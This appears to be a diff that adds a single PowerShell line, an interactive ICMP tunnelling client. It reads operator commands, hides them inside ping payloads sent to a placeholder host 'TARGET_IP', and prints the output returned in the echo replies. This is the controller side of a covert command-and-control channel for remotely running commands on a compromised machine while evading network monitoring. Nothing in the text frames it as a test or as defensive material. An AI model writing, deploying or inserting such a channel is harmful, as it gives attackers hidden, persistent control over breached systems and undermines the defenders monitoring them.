@@ -1,0 +1,1 @@
+while ($true) { $command = Read-Host "Enter command to execute"; $ping = New-Object System.Net.NetworkInformation.Ping; $response = $ping.Send("TARGET_IP", 1000, [Text.Encoding]::UTF8.GetBytes($command)); if ($response.Status -eq "Success") { $output = [Text.Encoding]::UTF8.GetString($response.Buffer); Write-Output "Response: $output" } }
